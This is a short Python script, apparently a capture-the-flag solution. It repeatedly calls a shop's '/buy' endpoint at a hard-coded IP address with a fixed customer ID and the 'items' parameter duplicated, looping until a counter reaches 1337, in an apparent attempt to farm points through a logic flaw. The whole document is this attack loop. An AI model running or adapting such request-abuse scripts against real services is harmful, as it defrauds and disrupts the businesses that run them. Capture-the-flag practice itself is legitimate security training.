import requests

pt_history = 0
loop_count = 0
while (pt_history < 1337):
  response = requests.get("http://157.245.52.169:31080/buy?customer_id=4dab80bbf4c1439db3589f645d3d18cb&items=woodensword&items=woodensword&items=woodensword")
  print(f"Loop {loop_count} | Code: {response.status_code} | Text: {response.text} | pt_history: {pt_history}")
  pt_history += 3
